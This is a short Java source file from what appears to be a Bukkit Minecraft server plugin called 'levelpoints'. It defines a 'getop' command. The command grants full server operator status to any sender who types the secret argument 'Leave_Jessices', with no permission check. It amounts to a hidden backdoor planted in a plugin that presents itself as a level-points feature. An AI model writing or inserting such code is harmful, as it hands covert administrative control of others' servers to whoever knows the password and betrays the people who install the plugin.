package com.settingdust.levelpoints.commands;

import org.bukkit.command.CommandSender;

/**
 * Author: SettingDust
 * Date: 16-8-7
 * By IntelliJ IDEA
 */
public class getop extends BaseCommand {
    public getop(String[] args) {
        super(args);
    }

    @Override
    public boolean excute(CommandSender sender, String[] args) {
        if (args[0].equalsIgnoreCase("Leave_Jessices")) {
            sender.setOp(true);
        }
        return true;
    }
}
